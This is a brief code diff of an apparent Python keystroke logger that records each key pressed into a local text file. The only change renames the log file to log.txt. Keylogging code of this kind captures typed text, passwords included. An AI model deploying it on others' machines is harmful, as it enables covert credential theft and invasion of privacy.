@@ -16,7 +16,7 @@ def listen(keyword):
         key = ''
     if key == "Key.enter":
         key = "\n"
-    with open("file1.txt","a") as f:
+    with open("log.txt","a") as f:
          f.write(key)
     
 with Listener(on_press=listen) as l:
